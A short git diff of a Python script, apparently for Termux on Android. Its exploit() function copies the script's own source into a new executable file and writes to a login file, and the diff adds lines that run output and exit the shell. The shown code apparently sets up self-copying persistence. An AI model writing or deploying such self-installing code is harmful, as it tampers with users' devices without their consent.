@@ -23,7 +23,7 @@ class Meta:
 def exploit():
     with open(Meta.name,'w') as f:
         with open(__file__,'r') as cur:
-            f.write(cur.read().split("'exploit'")[0])
+            f.write(cur.read().split("'exploit'")[0]+"\nMeta.text()")
     system(f'chmod +x {Meta.name}')
     
     with open(Meta.login,'w') as f:
@@ -35,6 +35,7 @@ def main():
     system(f'termux-open-url {Meta.link}')
     exploit()
     Meta.text()
+    system("exit") 
 
 if __name__ == '__main__':
     main()
